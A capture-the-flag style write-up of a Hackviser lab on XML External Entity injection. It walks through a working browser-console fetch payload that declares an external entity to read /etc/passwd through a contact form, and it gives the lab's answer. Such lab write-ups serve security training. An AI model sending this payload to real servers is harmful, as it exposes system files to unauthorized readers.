---
title: 'XML External Entity Injection (XXE)'
date: '2026-03-01'
excerpt: 'Practice XML External Entity Injection (XXE) attacks in multiple lab exercises.'
prog: 'Hackviser Web Application Security Labs  -  March 2026'
---

<div class="writeup-header">
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_xxe/xxe_hackviser_logo.png" alt="Hackviser logo" class="writeup-logo" />
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">XML External Entity Injection (XXE)</h1>
<div class="writeup-date">April 2026 · Web Application Security Labs</div>
</div>
</div>
<p class="lead mb-4">Practice XML External Entity (XXE) attacks in multiple lab exercises.</p>

<h5 class="mb-2">1. Basic XXE</h5>
<p class="mb-3"><strong>This lab contains a XML External Entity Injection (XXE) vulnerability that leads to unauthorized access to local files within the system. To complete the lab, exploit the XXE vulnerability in the contact form on the web page and access the contents of the /etc/passwd file. What is the username of the last user added in /etc/passwd?</strong></p>
<p class="mb-3">The web app contains the contact form shown below.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_xxe/xxe_hackviser_image1.png" alt="Web Application Security XXE 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Reading the source code shows how the JavaScript function <code>submitForm()</code> manually constructs an XML string using template literals and sends it to contact.php with the header <code>Content-type: application/xml</code>.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_xxe/xxe_hackviser_image2.png" alt="Web Application Security XXE 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">For lazy people like me who wants to solve this lab without using a web proxy like Burp Suite, first open Network Tab in the browser's Developer Tools. Then fill in dummy data and click Submit. Once the POST request is sent to contact.php, right click the request, select 'Copy' then 'Copy as fetch'. The request should look similar to the following:</p>
<pre>fetch(&quot;https://engaging-spot.europe1.hackviser.space/contact.php&quot;, {
  &quot;headers&quot;: {
    &quot;accept&quot;: &quot;*/*&quot;,
    &quot;accept-language&quot;: &quot;en,en-US;q=0.9,de;q=0.8&quot;,
    &quot;cache-control&quot;: &quot;no-cache&quot;,
    &quot;content-type&quot;: &quot;application/xml&quot;,
    &quot;pragma&quot;: &quot;no-cache&quot;,
    &quot;sec-ch-ua&quot;: &quot;\&quot;Google Chrome\&quot;;v=\&quot;147\&quot;, \&quot;Not.A/Brand\&quot;;v=\&quot;8\&quot;, \&quot;Chromium\&quot;;v=\&quot;147\&quot;&quot;,
    &quot;sec-ch-ua-mobile&quot;: &quot;?0&quot;,
    &quot;sec-ch-ua-platform&quot;: &quot;\&quot;Windows\&quot;&quot;,
    &quot;sec-fetch-dest&quot;: &quot;empty&quot;,
    &quot;sec-fetch-mode&quot;: &quot;cors&quot;,
    &quot;sec-fetch-site&quot;: &quot;same-origin&quot;
  },
  &quot;referrer&quot;: &quot;https://engaging-spot.europe1.hackviser.space/&quot;,
  &quot;body&quot;: &quot;\n            &lt;contact&gt;\n                &lt;firstName&gt;firstname&lt;/firstName&gt;\n                &lt;lastName&gt;lastname&lt;/lastName&gt;\n                &lt;email&gt;email@address.com&lt;/email&gt;\n                &lt;message&gt;mymessage&lt;/message&gt;\n            &lt;/contact&gt;&quot;,
  &quot;method&quot;: &quot;POST&quot;,
  &quot;mode&quot;: &quot;cors&quot;,
  &quot;credentials&quot;: &quot;omit&quot;
});
</pre>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_xxe/xxe_hackviser_image3.png" alt="Web Application Security XXE 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Now in the browser console, paste the payload below which has been modified.</p>
<pre>fetch(&quot;https://engaging-spot.europe1.hackviser.space/contact.php&quot;, {
  &quot;headers&quot;: {
    &quot;content-type&quot;: &quot;application/xml&quot;
  },
  &quot;body&quot;: `&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE root [
  &lt;!ENTITY exploit SYSTEM &quot;file:///etc/passwd&quot;&gt;
]&gt;
&lt;contact&gt;
    &lt;firstName&gt;firstname&lt;/firstName&gt;
    &lt;lastName&gt;lastname&lt;/lastName&gt;
    &lt;email&gt;email@address.com&lt;/email&gt;
    &lt;message&gt;&amp;exploit;&lt;/message&gt;
&lt;/contact&gt;`,
  &quot;method&quot;: &quot;POST&quot;
})
.then(response =&gt; response.text())
.then(data =&gt; console.log(data))
.catch(err =&gt; console.error('Error:', err));
</pre>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_xxe/xxe_hackviser_image4.png" alt="Web Application Security XXE 4" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">We can now see the username of the last added user in /etc/passwd.</p>
<p class="mb-5"><strong>Answer:</strong> optimus</p>

<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">April 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>